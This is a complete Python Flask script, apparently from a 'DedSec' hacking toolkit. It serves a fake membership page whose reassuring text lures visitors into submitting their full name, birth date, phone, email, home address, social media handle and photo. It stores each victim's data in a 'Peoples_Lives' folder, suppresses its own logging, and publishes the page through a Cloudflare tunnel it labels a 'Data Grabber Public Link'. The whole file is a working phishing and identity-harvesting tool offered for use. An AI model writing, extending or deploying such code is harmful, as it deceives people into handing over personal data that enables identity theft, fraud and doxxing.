import os
import sys
import subprocess
import re
import threading
import time
import logging
from flask import Flask, render_template_string, request
from datetime import datetime
from werkzeug.utils import secure_filename

# Auto-install missing packages quietly
def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "pycountry", "phonenumbers", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

import pycountry
from phonenumbers import COUNTRY_CODE_TO_REGION_CODE

# Flask app setup
app = Flask(__name__)

# Suppress Flask and Werkzeug logs completely
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)  # effectively silence
app.logger.setLevel(logging.ERROR + 10)

# Also silence Flask's startup messages by redirecting output temporarily
class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

# Data saving folder
BASE_FOLDER = os.path.expanduser("~/storage/downloads/Peoples_Lives")
os.makedirs(BASE_FOLDER, exist_ok=True)

# Build country dialing codes and countries lists dynamically
COUNTRY_CODES = []
for code, regions in COUNTRY_CODE_TO_REGION_CODE.items():
    for region in regions:
        country = pycountry.countries.get(alpha_2=region)
        if country:
            COUNTRY_CODES.append({"code": f"+{code}", "country": country.name})
COUNTRY_CODES_SORTED = sorted(COUNTRY_CODES, key=lambda x: x["country"])
COUNTRIES_SORTED = sorted([c.name for c in pycountry.countries])

@app.route('/')
def index():
    # Add a trustworthy explanation why users should submit info
    intro = (
        "At DedSec, we value your privacy and security. "
        "By submitting your details, you help us verify authentic members "
        "and build a safe, trusted community. Your information is kept confidential "
        "and only used to enhance our security measures."
    )
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <meta name="color-scheme" content="light dark" />
      <title>Become a DedSec Member Now!</title>
      <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet" />
      <style>
        :root {
          --primary: #00ffff;
          --bg-light: #f4f4f4;
          --text-light: #1e1e1e;
          --bg-dark: #121212;
          --text-dark: #f0f0f0;
          --accent: #00aaff;
          --container-bg-light: #ffffff;
          --container-bg-dark: #1e1e1e;
        }
        @media (prefers-color-scheme: dark) {
          body { background: var(--bg-dark); color: var(--text-dark); }
          .container {
            background: var(--container-bg-dark);
            border-left: 4px solid var(--primary);
            box-shadow: 0 0 30px rgba(0,255,255,0.15);
          }
          h2 { color: var(--primary); }
          input, select {
            background: #2a2a2a; color: var(--text-dark); border: 1px solid #444;
          }
          input[type="submit"] { background: var(--primary); color: #000; }
        }
        @media (prefers-color-scheme: light) {
          body { background: var(--bg-light); color: var(--text-light); }
          .container {
            background: var(--container-bg-light);
            border-left: 4px solid var(--accent);
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
          }
          h2 { color: var(--accent); }
          input, select {
            background: #fff; color: #000; border: 1px solid #ccc;
          }
          input[type="submit"] { background: var(--accent); color: #fff; }
        }
        body {
          font-family: 'Roboto', sans-serif;
          margin:0; padding:20px;
          display:flex; justify-content:center;
          min-height: 100vh;
          align-items: center;
        }
        .container {
          padding: 40px;
          max-width: 600px;
          width: 100%;
          border-radius: 8px;
          box-sizing: border-box;
        }
        h2 {
          margin-top: 0;
          font-weight: 700;
          font-size: 1.8em;
          margin-bottom: 10px;
        }
        p.intro {
          font-size: 1.1em;
          margin-bottom: 25px;
          line-height: 1.5;
          font-weight: 400;
        }
        label {
          display: block;
          margin: 15px 0 5px;
          font-weight: 500;
        }
        input, select {
          width: 100%;
          padding: 10px;
          border-radius: 4px;
          font-size: 1em;
          box-sizing: border-box;
        }
        .phone-group {
          display: flex;
          gap: 10px;
        }
        .phone-group select { flex: 1; }
        .phone-group input { flex: 2; }
        input[type="submit"] {
          border: none;
          padding: 12px;
          font-size: 1em;
          cursor: pointer;
          border-radius: 4px;
          margin-top: 20px;
          font-weight: 700;
          transition: background-color 0.3s ease;
        }
        input[type="submit"]:hover {
          opacity: 0.9;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h2>Become a DedSec Member Now!</h2>
        <p class="intro">{{ intro }}</p>
        <form action="/approve" method="post" enctype="multipart/form-data">
          <label>First Name *</label><input type="text" name="first_name" required>
          <label>Middle Name</label><input type="text" name="middle_name">
          <label>Last Name *</label><input type="text" name="last_name" required>
          <label>Date of Birth *</label><input type="date" name="dob" required>
          <label>Phone Number *</label>
          <div class="phone-group">
            <select name="country_code" required>
              <option value="">Code</option>
              {% for cc in country_codes %}
                <option value="{{ cc.code }}">{{ cc.code }} ({{ cc.country }})</option>
              {% endfor %}
            </select>
            <input type="tel" name="phone" required>
          </div>
          <label>Email *</label><input type="email" name="email" required>
          <label>Country *</label>
          <select name="country" required>
            <option value="">Select</option>
            {% for c in countries %}
              <option value="{{ c }}">{{ c }}</option>
            {% endfor %}
          </select>
          <label>City *</label><input type="text" name="city" required>
          <label>Address *</label><input type="text" name="address" required>
          <label>Postal Code *</label><input type="text" name="postal_code" required>
          <label>Social Media Username *</label><input type="text" name="social" required>
          <label>Photo *</label><input type="file" name="photo" accept="image/*" required>
          <input type="submit" value="Submit">
        </form>
      </div>
    </body>
    </html>
    ''', country_codes=COUNTRY_CODES_SORTED, countries=COUNTRIES_SORTED, intro=intro)

@app.route('/approve', methods=['POST'])
def approve():
    fields = ['first_name','middle_name','last_name','dob','country_code','phone','email','country','city','address','postal_code','social']
    data = {f: request.form.get(f, '').strip() for f in fields}
    photo = request.files.get('photo')

    user_folder = os.path.join(BASE_FOLDER, f"{data['first_name']}_{data['last_name']}")
    os.makedirs(user_folder, exist_ok=True)

    with open(os.path.join(user_folder, "application_info.txt"), 'w') as file:
        for key, value in data.items():
            file.write(f"{key.replace('_', ' ').title()}: {value}\n")

    if photo:
        secure_name = secure_filename(photo.filename)
        name, ext = os.path.splitext(secure_name)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        photo.save(os.path.join(user_folder, f"{name}_{timestamp}{ext}"))

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <meta name="color-scheme" content="light dark" />
      <title>Application Received</title>
      <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet" />
      <style>
        :root {
          --primary: #00ffff;
          --bg-light: #f4f4f4;
          --text-light: #1e1e1e;
          --bg-dark: #121212;
          --text-dark: #f0f0f0;
          --accent: #00aaff;
          --container-bg-light: #ffffff;
          --container-bg-dark: #1e1e1e;
        }
        @media (prefers-color-scheme: dark) {
          body { background: var(--bg-dark); color: var(--text-dark); }
          .container {
            background: var(--container-bg-dark);
            border-left: 4px solid var(--primary);
            box-shadow: 0 0 30px rgba(0,255,255,0.15);
          }
          h2 { color: var(--primary); }
        }
        @media (prefers-color-scheme: light) {
          body { background: var(--bg-light); color: var(--text-light); }
          .container {
            background: var(--container-bg-light);
            border-left: 4px solid var(--accent);
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
          }
          h2 { color: var(--accent); }
        }
        body {
          font-family: 'Roboto', sans-serif;
          margin:0; padding:20px;
          display:flex; justify-content:center;
          min-height: 100vh;
          align-items: center;
        }
        .container {
          padding: 40px;
          max-width: 600px;
          width: 100%;
          border-radius: 8px;
          box-sizing: border-box;
          text-align: center;
        }
        h2 {
          margin-top: 0;
          font-weight: 700;
          font-size: 1.8em;
          margin-bottom: 10px;
        }
        p {
          font-size: 1.1em;
          margin-top: 20px;
          line-height: 1.4;
        }
      </style>
      <meta http-equiv="refresh" content="5; url=/" />
    </head>
    <body>
      <div class="container">
        <h2>Thank you for your application!</h2>
        <p>We received your details and will be in touch soon.<br>You will be redirected to the homepage shortly.</p>
      </div>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--protocol", "http2", "--url", local_url]

    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    tunnel_url = None
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"Data Grabber Public Link: {tunnel_url}")
            sys.stdout.flush()
            break
    return process

if __name__ == '__main__':
    # Suppress Flask startup messages by redirecting stdout/stderr temporarily
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    # Run flask app in a separate thread so we can run cloudflared tunnel simultaneously
    def run_flask():
        app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    # Restore stdout/stderr after server starts
    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5000")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        sys.exit(0)

